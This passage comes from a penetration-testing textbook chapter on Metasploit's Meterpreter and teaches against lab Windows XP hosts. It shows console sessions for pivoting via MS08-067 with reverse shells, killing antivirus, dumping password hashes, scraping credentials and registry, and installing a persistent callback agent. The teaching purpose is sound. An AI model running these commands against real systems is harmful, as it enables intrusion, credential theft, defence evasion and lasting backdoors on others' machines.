456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ...
[*] Calling the vulnerable function...
[*] Sending stage (36 bytes)
[*] Command shell session 1 opened (10.10.1.129:8080 -&gt; 192.168.33.132:1608) <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/></pre><p class="calibre2">Compare the <code class="literal">LHOST</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8183" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and <code class="literal">RHOST</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8192" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> variables to the network information displayed by <code class="literal">ifconfig</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8202" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>. Our <code class="literal">LHOST</code> option specifies the IP address of our attacking machine. Also notice, the <code class="literal">RHOST</code> option IP address is set to a different network subnet and that we are attacking systems by tunneling our traffic through our compromised target to additional systems on the target’s network. We are leveraging the pivoting attack through Metasploit to pass communications through our exploited machine to the target machine that resides on the local subnet. In this case, if the heap overflow is successful, we should be presented with a reverse shell from 192.168.33.132, simply by leveraging the network communications on the already compromised machine. When we run the exploit with <code class="literal">exploit</code>, we see at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8217" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> that a connection is set up as expected on a different machine, not the Windows XP machine. Now, to port scan through the pivot, we would use the <span class="strong"><em class="calibre4">scanner/portscan/tcp</em></span> scanner module, which is built to handle routing through Metasploit.<a id="IDX-CHP-6-0121" class="strong"/><a id="IDX-CHP-6-0122" class="strong"/><a id="IDX-CHP-6-0123" class="strong"/><a id="IDX-CHP-6-0124" class="strong"/><a id="IDX-CHP-6-0125" class="strong"/><a id="IDX-CHP-6-0126" class="strong"/></p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">You could also use the <span class="strong"><em class="calibre4">scanner/portscan/tcp</em></span> scanner to conduct a series of port scans through your compromised target on the local subnet itself. We won’t go into the details here, but just know that you can perform port scanning on a compromised network leveraging this module.</p></div><div class="book"><hr class="calibre5"/></div><p class="calibre2">In the preceding examples, we used the <code class="literal">route add</code> command after we had compromised the system. Alternatively, to add the routes automatically to Meterpreter upon a new session spawn, we could use <code class="literal">load auto_add_route</code>:</p><a id="I_programlisting6_d1e8260" class="strong"/><pre class="programlisting">msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">load auto_add_route</code></strong>
[*] Successfully loaded plugin: auto_add_route

msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>
[*] Started reverse handler on 10.10.1.129:443
[*] Triggering the vulnerability...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (10.10.1.129:443 -&gt; 192.168.33.130:1090)
[*] AutoAddRoute: Routing new subnet 192.168.33.0/255.255.255.0 through session 1</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="using_meterpreter_scripts">Using Meterpreter Scripts</h2></div></div></div><p class="calibre2">Several external Meterpreter scripts can help you to enumerate a system or perform predefined tasks inside the Meterpreter shell. We won’t cover every script here, but we will mention a few of the most notable ones.<a id="IDX-CHP-6-0127" class="strong"/><a id="IDX-CHP-6-0128" class="strong"/><a id="IDX-CHP-6-0129" class="strong"/><a id="IDX-CHP-6-0130" class="strong"/><a id="IDX-CHP-6-0131" class="strong"/><a id="IDX-CHP-6-0132" class="strong"/><a id="IDX-CHP-6-0133" class="strong"/></p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">The Meterpreter scripts are in the process of being moved to post exploitation modules. We’ll cover both scripts and post exploitation modules in this chapter.</p></div><div class="book"><hr class="calibre5"/></div><p class="calibre2">To run a script from the Meterpreter console, enter <strong class="calibre3"><code class="calibre6">run</code></strong><em class="calibre4"><code class="calibre9">scriptname</code></em>. The script will either execute or provide additional help on how to run it.</p><p class="calibre2">Should you want to use an interactive remote GUI on the system, you can use the VNC protocol to tunnel the active desktop communications and interact with the GUI desktop on the target machine. But in some cases, the system may be locked and you may be unable to access it. Never fear: Metasploit has us covered.</p><p class="calibre2">In the following example, we issue the <code class="literal">run vnc</code> command, which installs a VNC session on the remote system. From there, we launch <code class="literal">run screen_unlock</code> to unlock the target machine so that we can view the desktop. As a result, a VNC window should appear, showing us the target desktop.<a id="IDX-CHP-6-0134" class="strong"/></p><a id="I_programlisting6_d1e8321" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run vnc</code></strong>
[*] Creating a VNC reverse tcp stager: LHOST=192.168.33.129 LPORT=4545)
[*] Running payload handler
[*] VNC stager executable 37888 bytes long
[*] Uploaded the VNC agent to C:\WINDOWS\TEMP\CTDWtQC.exe (must be deleted manually)
[*] Executing the VNC agent with endpoint 192.168.33.129:4545...
[*] VNC Server session 2 opened (192.168.33.129:4545 -&gt; 192.168.33.130:1091)</pre><p class="calibre2">This will give us a VNC graphical interface to the target machine and allow us to interact through a desktop.</p><a id="I_programlisting6_d1e8328" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run screen_unlock</code></strong>
[*] OS 'Windows XP (Build 2600, Service Pack 2).' found in known targets
[*] patching...
[*] done!</pre><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="migrating_a_process">Migrating a Process</h3></div></div></div><p class="calibre2">Often, when we are attacking a system and exploiting a service such as Internet Explorer, if the target user closes the browser, the Meterpreter session is also closed and we lose our connection to the target. To avoid this problem, we can use the <span class="strong"><em class="calibre4">migrate</em></span> post exploitation module, shown next, to attempt to migrate the service to a memory space that won’t close when the target closes the browser. By migrating to a different, more stable process, we ensure that the process isn’t closed and we maintain our connection to the system.<a id="IDX-CHP-6-0135" class="strong"/></p><a id="I_programlisting6_d1e8348" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run post/windows/manage/migrate</code></strong>
[*] Running module against V-MAC-XP
[*] Current server process: revterp.exe (2436)
[*] Migrating to explorer.exe...
[*] Migrating into process ID 816
[*] New server process: Explorer.EXE (816)</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="killing_antivirus_software">Killing Antivirus Software</h3></div></div></div><p class="calibre2">Antivirus software can block certain tasks. During penetration tests, we have seen “smarter” antivirus or host-based intrusion prevention products block our ability to run certain attack vectors. In such cases, we can run the <code class="literal">killav</code> script to stop the processes preventing our tasks from running.<a id="IDX-CHP-6-0136" class="strong"/><a id="IDX-CHP-6-0137" class="strong"/><a id="IDX-CHP-6-0138" class="strong"/><a id="IDX-CHP-6-0139" class="strong"/><a id="IDX-CHP-6-0140" class="strong"/><a id="IDX-CHP-6-0141" class="strong"/><a id="IDX-CHP-6-0142" class="strong"/><a id="IDX-CHP-6-0143" class="strong"/><a id="IDX-CHP-6-0144" class="strong"/><a id="IDX-CHP-6-0145" class="strong"/><a id="IDX-CHP-6-0146" class="strong"/><a id="IDX-CHP-6-0147" class="strong"/></p><a id="I_programlisting6_d1e8414" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run killav</code></strong>
[*] Killing Antivirus services on the target...
[*] Killing off cmd.exe...
[*] Killing off cmd.exe...</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="obtaining_system_password_hashes">Obtaining System Password Hashes</h3></div></div></div><p class="calibre2">Obtaining a copy of the system’s password hashes allows us to run pass-the-hash attacks or to brute force the hash to reveal the plain-text password. We can obtain the password hashes with the <code class="literal">run hashdump</code> command:</p><a id="I_programlisting6_d1e8428" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run hashdump</code></strong>
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY de4b35306c5f595438a2f78f768772d2...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hashes...

Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="viewing_all_traffic_on_a_target_machine">Viewing All Traffic on a Target Machine</h3></div></div></div><p class="calibre2">To see all traffic on a target, we can run a packet recorder. Everything captured by <code class="literal">packetrecorder</code> is saved in the <span class="strong"><em class="calibre4">.pcap</em></span> file format to be parsed with a tool such as Wireshark.<a id="IDX-CHP-6-0148" class="strong"/></p><p class="calibre2">In this listing, we run the <code class="literal">packetrecorder</code> script with the <code class="literal">-i 1</code> option, which specifies which interface we want to use to perform the packet captures:</p><a id="I_programlisting6_d1e8459" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run packetrecorder -i 1</code></strong>
[*] Starting Packet capture on interface 1
[*] Packet capture started</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="scraping_a_system">Scraping a System</h3></div></div></div><p class="calibre2">The <code class="literal">scraper</code> script enumerates just about everything you could ever want from a system. It will grab the usernames and passwords, download the entire registry, dump password hashes, gather system information, and export the <code class="literal">HKEY_CURRENT_USER</code> (<code class="literal">HKCU</code>).<a id="IDX-CHP-6-0149" class="strong"/></p><a id="I_programlisting6_d1e8485" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run scraper</code></strong>
[*] New session on 192.168.33.130:1095...
[*] Gathering basic system information...
[*] Dumping password hashes...
[*] Obtaining the entire registry...
[*] Exporting HKCU
[*] Downloading HKCU (C:\WINDOWS\TEMP\XklepHOU.reg)</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="using_persistence">Using Persistence</h3></div></div></div><p class="calibre2">Meterpreter’s <code class="literal">persistence</code> script allows you to inject a Meterpreter agent to ensure that Meterpreter is running even after the target system reboots. If this is a reverse connection, you can set intervals for the target to connect back to the attacker machine. If it’s a bind, you can have it attempt to bind on an interface at a given time.<a id="IDX-CHP-6-0150" class="strong"/><a id="IDX-CHP-6-0151" class="strong"/><a id="IDX-CHP-6-0152" class="strong"/><a id="IDX-CHP-6-0153" class="strong"/></p><div class="book"><hr class="calibre5"/></div><div class="warning" epub:type="warning"><h3 class="title6">Warning</h3><p class="calibre2">If you use this functionality, be sure that you remove it after you’re done. If you forget to do this, any attacker can also gain access to the system without authentication!</p></div><div class="book"><hr class="calibre5"/></div><p class="calibre2">In the following listing, we run <code class="literal">persistence</code> and tell Windows to autostart the agent at boot time (<code class="literal">-X</code>), wait 50 seconds (<code class="literal">-i 50</code>) before connection retries, run on port 443 (<code class="literal">-p 443</code>), and connect to IP 192.168.33.129. We then establish a listener for the agent at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8533" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> with <code class="literal">use multi/handler</code>, and after setting a couple of options and running <code class="literal">exploit</code>, we see at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8546" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> that the connection comes in as expected.</p><a id="I_programlisting6_d1e8552" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run persistence -X -i 50 -p 443 -r 192.168.33.129</code></strong>
[*] Creating a persistent agent: LHOST=192.168.33.129
 LPORT=443 (interval=50 onboot=true)
[*] Persistent agent script is 316384 bytes long
[*] Uploaded the persistent agent to C:\WINDOWS\TEMP\asSnqrlUDRwO.vbs
[*] Agent executed with PID 3160
[*] Installing into autorun as HKLM\Software\Microsoft\Windows
\CurrentVersion\Run\xEYnaHedooc <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
[*] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\
    xEYnaHedooc
msf&gt; <strong class="calibre3"><code class="calibre6">use multi/handler</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">set payload windows/meterpreter/reverse_tcp</code></strong>
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">set LPORT 443</code></strong>
LPORT =&gt; 443
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 192.168.33.129</code></strong>
LHOST =&gt; 192.168.33.129
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>

[*] Started reverse handler on 192.168.33.129:443
[*] Starting the payload handler...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 2 opened (192.168.33.129:443 -&gt; 192.168.33.130:1120) <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/></pre><p class="calibre2">As of this writing, the only way to remove the Meterpreter agent is to delete the registry entry in <span class="strong"><em class="calibre4">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</em></span> and remove the VBScript located in <span class="strong"><em class="calibre4">C:\WINDOWS\TEMP\</em></span>. Be sure to document the registry keys and locations (such as <span class="strong"><em class="calibre4">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\xEYnaHedooc</em></span> <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8601" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>) to remove them manually. Generally, you can do this through Meterpreter or drop to a shell and remove it that way. If you feel more comfortable using a GUI, you can use <code class="literal">run vnc</code> and remove the script with <span class="strong"><em class="calibre4">regedit</em></span>. (Note that the registry keys will change each time, so make sure that you document where Metasploit adds the registry keys.)<a id="IDX-CHP-6-0154" class="strong"/><a id="IDX-CHP-6-0155" class="strong"/><a id="IDX-CHP-6-0156" class="strong"/><a id="IDX-CHP-6-0157" class="strong"/><a id="IDX-CHP-6-0158" class="strong"/><a id="IDX-CHP-6-0159" class="strong"/><a id="IDX-CHP-6-0160" class="strong"/><a id="IDX-CHP-6-0161" class="strong"/><a id="IDX-CHP-6-0162" class="strong"/><a id="IDX-CHP-6-0163" class="strong"/><a id="IDX-CHP-6-0164" class="strong"/><a id="IDX-CHP-6-0165" class="strong"/></p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="leveraging_post_exploitation_modules">Leveraging Post Exploitation Modules</h2></div></div></div><p class="calibre2">As mentioned earlier, the Meterpreter scripts are slowly being converted to post exploitation modules. The move to post exploitation modules will finally give a fully consistent standard and format to the Metasploit modules. As you read through later chapters, you’ll see the overall structure of auxiliary modules and exploits. In the past, Meterpreter scripts used their own format, which was very different from the way other modules behaved.</p><p class="calibre2">One added benefit of moving the modules to the same format is the ability to perform the same attack on all sessions available. Suppose, for example, that you have 10 open Meterpreter shells. In the traditional fashion, you would need to run <code class="literal">hashdump</code> on each or write custom scripts to query through each console. In the new format, you would be able to interact with each session and perform the <code class="literal">hashdump</code> on multiple systems if needed.</p><p class="calibre2">The next listing shows an example of how to use the post exploitation modules:</p><a id="I_programlisting6_d1e8673" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run post/windows/gather/hashdump</code></strong>
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY de4b35306c5f595438a2f78f768772d2...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hashes...</pre><p class="calibre2">To see a list of post exploitation modules, enter the following and then press the <span class="keycap">tab</span> key on your keyboard at the end of the line:</p><a id="I_programlisting6_d1e8683" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run post/</code></strong></pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="upgrading_your_command_shell_to_meterpre">Upgrading Your Command Shell to Meterpreter</h2></div></div></div><p class="calibre2">One of the newer features in the Metasploit Framework is its ability to upgrade a command shell payload to a Meterpreter payload once the system has been exploited, by issuing the <code class="literal">sessions -u</code> command. This is useful if we use a command shell payload as an initial stager and then find that this newly exploited system would make the perfect launching pad for further attacks into the network. Let’s look at a quick example from start to finish using MS08-067 with a reverse command shell as the payload, and upgrade it to a Meterpreter shell.<a id="IDX-CHP-6-0166" class="strong"/><a id="IDX-CHP-6-0167" class="strong"/><a id="IDX-CHP-6-0168" class="strong"/><a id="IDX-CHP-6-0169" class="strong"/><a id="IDX-CHP-6-0170" class="strong"/></p><a id="I_programlisting6_d1e8710" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">msfconsole</code></strong>
msf &gt; <strong class="calibre3"><code class="calibre6">search ms08_067</code></strong>
[*] Searching loaded modules for pattern 'ms08_067'...

Exploits
========

   Name                         Rank   Description
   ----                         ----   -----------
   windows/smb/ms08_067_netapi  great  Microsoft Server Service Relative Path Stack
    Corruption

msf &gt; <strong class="calibre3"><code class="calibre6">use windows/smb/ms08_067_netapi</code></strong>
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set PAYLOAD windows/shell/reverse_tcp</code></strong>
payload =&gt; windows/shell/reverse_tcp
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">set TARGET 3</code></strong>
target =&gt; 3
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">setg LHOST 192.168.33.129</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
LHOST =&gt; 192.168.33.129
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">setg LPORT 8080</code></strong>
LPORT =&gt; 8080
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">exploit -z</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>

[*] Started reverse handler on 192.168.33.129:8080
[*] Triggering the vulnerability...
[*] Sending stage (240 bytes)
[*] Command shell session 1 opened (192.168.33.129:8080 -&gt; 192.168.33.130:1032)
[*] Session 1 created in the background.
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">sessions -u 1</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>

[*] Started reverse handler on 192.168.33.129:8080
[*] Starting the payload handler...
[*] Command Stager progress - 3.16% done (1694/53587 bytes)
[*] Command Stager progress - 6.32% done (3388/53587 bytes)

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

[*] Command Stager progress - 97.99% done (52510/53587 bytes)
[*] Sending stage (748032 bytes)
msf exploit(ms08_067_netapi) &gt; [*] Meterpreter session 2
 opened (192.168.33.129:8080 -&gt;
    192.168.33.130:1044)
msf exploit(ms08_067_netapi) &gt; <strong class="calibre3"><code class="calibre6">sessions -i 2</code></strong>
[*] Starting interaction with 2...
meterpreter &gt;</pre><p class="calibre2">At <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8767" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> we issue the <code class="literal">setg</code> command for <code class="literal">LHOST</code> and <code class="literal">LPORT</code>, which is required in order for the <code class="literal">sessions -u 1</code> to upgrade to Meterpreter at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8786" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>. (The <code class="literal">setg</code> command sets the <code class="literal">LPORT</code> and <code class="literal">LHOST</code> globally in Metasploit, not just for this exploit.)</p><p class="calibre2">Notice at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8803" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> that when we exploit the system we issue the <code class="literal">exploit -z</code> command, which will not interact with the session once the target has been exploited. If you had already executed the <code class="literal">exploit</code> command at this point, you could simply press <span class="keycap">ctrl-Z</span> and run the session in the background.<a id="IDX-CHP-6-0171" class="strong"/><a id="IDX-CHP-6-0172" class="strong"/><a id="IDX-CHP-6-0173" class="strong"/><a id="IDX-CHP-6-0174" class="strong"/><a id="IDX-CHP-6-0175" class="strong"/><a id="IDX-CHP-6-0176" class="strong"/><a id="IDX-CHP-6-0177" class="strong"/><a id="IDX-CHP-6-0178" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="manipulating_windows_apis_with_the_railg">Manipulating Windows APIs with the Railgun Add-On</h2></div></div></div><p class="calibre2">You can interface with the Windows native API directly through a Metasploit add-on called <span class="strong"><em class="calibre4">Railgun</em></span>, which was written by Patrick HVE. By adding Railgun to the Metasploit Framework, you can natively call Windows APIs through Meterpreter, all through the Windows API. For example, in the following listing, we’ll drop into an interactive Ruby shell (<code class="literal">irb</code>), available through Meterpreter. The <code class="literal">irb</code> shell allows us to interact directly with Meterpreter through Ruby-based syntax. We call Railgun in this example and create a simple pop-up box saying “hello world”.<a id="IDX-CHP-6-0179" class="strong"/></p><a id="I_programlisting6_d1e8862" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">irb</code></strong>
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
&gt;&gt; client.railgun.user32.MessageBoxA(0,"hello","world","MB_OK")</pre><p class="calibre2">On our target Windows XP machine, you should see a pop-up box with <span class="strong"><em class="calibre4">world</em></span> in the title bar and <span class="strong"><em class="calibre4">hello</em></span> in the message box. In this example, we simply called the <span class="strong"><em class="calibre4">user32.dll</em></span> and the <code class="literal">MessageBoxA</code> function, which takes the parameters as shown.<a id="IDX-CHP-6-0180" class="strong"/></p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">For a list of all documented API calls, visit <a class="xref" href="http://msdn.microsoft.com/" target="_top">http://msdn.microsoft.com/</a>.</p></div><div class="book"><hr class="calibre5"/></div><p class="calibre2">We won’t cover Railgun in detail (you can find a tutorial within the Framework directory under <span class="strong"><em class="calibre4">external/source/meterpreter/source/extensions/stdapi/server/railgun/</em></span>, but this gives you an idea of its power.</p><p class="calibre2">The implications are huge: Railgun gives you the same capabilities as a native Win32 application with full access to the Windows API.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="wrapping_up-id2">Wrapping Up</h2></div></div></div><p class="calibre2">Hopefully, you’re now pretty comfortable with Meterpreter. We haven’t gone through every Meterpreter flag and option, because we expect your knowledge of Meterpreter to grow as you experiment and use it. Meterpreter is a continuously evolving tool with an enormous amount of support for scripts and additions. Once you become comfortable with the overall interface, you will be able to master anything new. In <a class="xref" href="part0020.html#meterpreter_scripting">Chapter 16</a>, you will learn how to create your own Meterpreter scripts from scratch and how the overall structure of a Meterpreter script is designed.</p></div></section></body></html>